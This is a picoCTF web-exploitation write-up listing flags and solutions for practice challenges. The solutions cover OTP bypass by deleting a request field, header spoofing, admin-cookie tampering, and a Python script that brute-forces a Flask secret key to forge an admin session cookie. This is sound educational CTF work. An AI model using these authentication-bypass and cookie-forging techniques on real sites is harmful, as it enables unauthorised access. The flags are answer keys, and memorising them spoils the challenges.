# PicoCTF - Web Exploitation
All of these picoGym challenges fall under the domain of Web Exploitation. 
# Challenges
## Inspect HTML
__Flag__:`picoCTF{1n5p3t0r_0f_h7ml_8113f7e2}`

__Solution__: Just use the `Inspect Element` option in your browser and find the flag in the `html` code of the website. Easy-peasy.

<img width="436" alt="{5985E94C-F353-4013-87DD-D7C12B6A3721}" src="https://github.com/user-attachments/assets/f5fe5622-7e40-4b28-b9b4-941a03b99487">

## IntroToBurp
__Flag__:`picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}`

__Solution__: This challenge is meant as an introduction to BurpSuite, an application that acts as a proxy between your browser and the sites you visit, essentially allowing you to read, write and modify the traffic sent in between. So here we get this site:

<img width="263" alt="{4DD1F7FB-F3C8-4CE9-A65F-CA880FAA55C7}" src="https://github.com/user-attachments/assets/7365b953-efd1-4124-a814-6196806777d8">

After filling in random details and pressing register, we get this:

<img width="230" alt="{06598A44-E6EC-4FDF-8643-E96A8D1F929E}" src="https://github.com/user-attachments/assets/96f7e496-8db6-472b-8714-723f7ffc4566">

Now, since we obviously dont have any OTP, we just put some nonsense and then get this:

<img width="112" alt="{E2E12D68-C7F6-48E5-AC87-143FD880C5F6}" src="https://github.com/user-attachments/assets/e298f79f-a42b-4cf2-a585-9fd6be5d344f">

So, we need to find the OTP somehow, but how? ... What if we could bypass the OTP?
Using BurpSuite, we take a look at the request sent to the site during 2FA authentication:

<img width="378" alt="{742BB6D0-B25F-44DA-8B1A-F11E67BDB113}" src="https://github.com/user-attachments/assets/49326529-da1a-4415-8627-9768bbd716ac">

As you can see, at the end we got the `otp` field, i put `bruh` in it and submitted it. But what if i removed it entirely? deleting the `otp` entirely:

<img width="387" alt="{E3F55905-B1AB-4AB3-A760-00F0588126D6}" src="https://github.com/user-attachments/assets/9b212a7a-4aa5-4c00-8f86-fc4cb2687f44">

After forwarding this request, we get the result:

<img width="596" alt="{66FD2708-5D1F-4B49-A369-D5E970BA910F}" src="https://github.com/user-attachments/assets/815a16fb-b433-4ecf-9ec8-6c353f9bf513">

## dont-use-client-side
__Flag__:`picoCTF{no_clients_plz_b706c5}`

__Solution__: This is a pretty easy challenge, you go to the site and see that a password is required.

<img width="350" alt="{AF419262-AFB8-4DEE-96EA-20489D0911CE}" src="https://github.com/user-attachments/assets/f7dd28b9-2feb-4551-9df7-8bc52e9d279b">

Using `inspect element` to view the `html` code gives us nothing
so we view the javascript code of the website, `index.js` using the `Debugger` tab, where we can see a nested if-else statement for a particular password string, which of course, happens to be our flag.

<img width="365" alt="{58C718F1-0C0C-4EC6-BFC1-B93508FD29AC}" src="https://github.com/user-attachments/assets/6dcab0c8-145c-482b-9557-5e04f4b76e4b">

## where are the robots
__Flag__:`picoCTF{ca1cu1at1ng_Mach1n3s_477ce}`

__Solution__: Okay, so in this challenge, the site is displayed as:

<img width="241" alt="{B6E572AE-F54A-4B20-8982-FB688E05CCFA}" src="https://github.com/user-attachments/assets/11afb775-bc22-43e9-9e1c-61ba5ec18306">

Since the name of the challenge mentions robots specifically, webcrawlers come to mind especially.
Websites usually have a page called `robots.txt` meant specifically for bots to visit first when crawling the web. This is done specifically to avoid overloading the website with requests.
Anyway, appending `robots.txt` to the url gives us:

<img width="190" alt="{01C36F1F-9F4B-4F69-999E-B2B14C031C80}" src="https://github.com/user-attachments/assets/97be05f2-0f27-473d-81f9-d0bd47799ce3">

Disallow means the bot is not allowed to visit that URL, but we can, so setting the User Agent as `*` and going to the URL `https://jupiter.challenges.picoctf.org/problem/36474/477ce.html` gives us:

<img width="267" alt="{8752F9E3-123F-42EF-B38B-745D3B7DF87A}" src="https://github.com/user-attachments/assets/b72c3b0b-8fc3-4dd4-b0be-e1972c35b7c6">

## SQL Direct
__Flag__:`picoCTF{L3arN_S0m3_5qL_t0d4Y_21c94904}`

__Solution__: Here, we get our first experience with SQL. For this challenge, we need to connect to a PostgreSQL server and find the flag.
Using the command `psql -h saturn.picoctf.net -p 60745 -U postgres pico` to connect to the database, we see this:
```
kerosene-picoctf@webshell:~$ psql -h saturn.picoctf.net -p 58949 -U postgres pico
Password for user postgres: 
psql (14.13 (Ubuntu 14.13-0ubuntu0.22.04.1), server 15.2 (Debian 15.2-1.pgdg110+1))
WARNING: psql major version 14, server major version 15.
         Some psql features might not work.
Type "help" for help.
```
Since this is a database, the flag is likely hidden in some table, so we use `\dt` for PostgreSQL to view all the tables which gives us:
```
pico=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)
```

Now, we need to view the contents of the `flags` table. So, we do that using the command `SELECT * FROM flags;`. 
Here, `*` is used to select all the columns (like file globbing) and display them.

<img width="447" alt="{F1C1526B-16A0-4EA8-9D69-E4F15451DD8E}" src="https://github.com/user-attachments/assets/6cde0470-9363-4442-8586-b39ec07ee3a4">

## Some Assembly Required 1
__Flag__:`picoCTF{d88090e679c48f3945fcaa6a7d6d70c5}`

__Solution__: Go to the website and inspect the source code. Using the`Debugger`, you will see that in a WASM (WebAssembly) file, the flag has been provided:

<img width="438" alt="{0ED3F63C-1730-4A7E-B440-AA670E4C0AE6}" src="https://github.com/user-attachments/assets/787bb7f1-923d-44ea-b065-da7f5d0e9103">


## Who are you?
__Flag__:`picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0da16bb2}`

__Solution__: This is a pretty fun challenge focusing on headers within a request. When you first visit a site you get this

`I don't trust users visiting from another site.`

So we add a Referer Header in the request which is same as the host site
Referer: mercury.picoctf.net:39114/. Then we get this:

```
Sorry, this site only worked in 2018.
```

Then we add the Date Header in the request with value of `2018`

```
I don&#39;t trust users who can be tracked.
```

And now you add a DNT Header with value `1`.

```
This website is only for people from Sweden.
```

Now, you add the header IP Address X-Forwarded-For: 102.177.146.0 to make the request look like its from Sweden.

```
You&#39;re in Sweden but you don&#39;t speak Swedish?
```

Finally we edit the language header to `sv-SE,sv;q=0.9` to change the language to Swedish
`What can I say except, you are welcome` 
and then we get the flag.

<img width="486" alt="{32990F7C-941C-4B34-A494-DC6B15B97F21}" src="https://github.com/user-attachments/assets/f31999f8-a48b-46b9-8f57-85506fc2a125">

## Power Cookie
__Flag__:`picoCTF{gr4d3_A_c00k13_65fd1e1a}`

__Flag__: This was an easy. All you had to do was the change the value of the cookie `isAdmin` from `0` to `1`. The website then recognized us as the admin and we got this:

<img width="264" alt="{CB0F1273-ACBF-4181-8B0D-C8C7A5306AC2}" src="https://github.com/user-attachments/assets/3d51f114-0190-48c9-b75f-0a2125394b01">

## Most Cookies
__Flag__:`picoCTF{pwn_4ll_th3_cook1E5_5f016958}`

__Solution__: Confusing challenge for me. So this challenge deals with flask cookies. For example our session cookie:`eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZyrxZg.sIwo7Z59uyO8iKRtWLMNolWwpgw`.
Now this cookie is base 64 encoded, so if you decode it you will get: `very auth: blank`. Our goal here, and the way to get the flag is to set `very auth` to `admin`. However, we cannot do that. The thing is the second part of the cookie is signed by an algorithm using a secret key, and without finding that secret key, the server will not accept the cookie. 

Now, the wordlist for the secret key is given in the `server.py` file. Using a python script, we can find the secret key and thus, the admin cookie which we will input.
```
import hashlib
from itsdangerous import URLSafeTimedSerializer
from itsdangerous.exc import BadTimeSignature
from flask.sessions import TaggedJSONSerializer
def flask_cookie(secret_key, cookie_str, operation):
    # This function is a simplified version of the SecureCookieSessionInterface: https://github.com/pallets/flask/blob/020331522be03389004e012e008ad7db81ef8116/src/flask/sessions.py#L304.
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    if operation == "decode":
        return s.loads(cookie_str)
    else:
        return s.dumps(cookie_str)

# The list of possible secret keys used by the app.
possible_keys = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

# An encoded cookie pulled from the live application that can be used to guess the secret key.
cookie_str = "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Zyro9w.RZkvSmhhFTnRR7SbIK_n5pt9wyM"

# For each possible key try to decode the cookie.
for possible_secret_key in possible_keys:
    try:
        cookie_decoded = flask_cookie(possible_secret_key, cookie_str, "decode")
    except BadTimeSignature:
        # If the decoding fails then try the next key.
        continue
    secret_key = possible_secret_key
    # Break the loop when we have the corret key.
    break

print("Secret Key: %s" % secret_key)

# The admin cookie has the `very_auth` value set to `admin`, which can be seen on line 46 of the server.py code.
admin_cookie = {"very_auth": "admin"}
# Encode the cookie used the `SecureCookieSessionInterface` logic.
admin_cookie_encoded = flask_cookie(secret_key, admin_cookie, "encode")

print("Admin Cookie: %s" % admin_cookie_encoded)

```
```
Secret Key: gingersnap
Admin Cookie: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZyrwJw.ubUbLt-OSVdMFv2c6MsAr9cRaRc
```

<img width="561" alt="{F5C1BF0B-29FB-4C48-BF76-C625D5BA18A5}" src="https://github.com/user-attachments/assets/161ea9c8-4db1-4c95-9764-999715af79e5">


## WebDecode
__Flag__:`picoCTF{web_succ3ssfully_d3c0ded_df0da727}`

__Solution__: Just use `inspect element` for one of the webpages where you will find a Base64 encoded string,
decoding that will give you the flag:

<img width="482" alt="{4D074272-E6BD-4289-A78E-E7BE99E95B38}" src="https://github.com/user-attachments/assets/c473176d-91c4-40e0-a619-ec53e352a49a">

## BookMarklet
__Flag__:`picoCTF{p@g3_turn3r_cebccdfe}`

__Solution__: Input the java script code given in the bookmarklet to the `console`, you will get the flag:

<img width="405" alt="{70634CB9-DD29-460F-B3CE-C5654FBBF957}" src="https://github.com/user-attachments/assets/f6e2fb9e-6752-4847-8312-88fad362185d">

## On Includes
__Flag__:`picoCTF{1nclu51v17y_1of2_f7w_2of2_b8f4b022}`

__Solution__: The flag is split in two parts, one is the `style.css` part and the other is the javascript code for the website. 
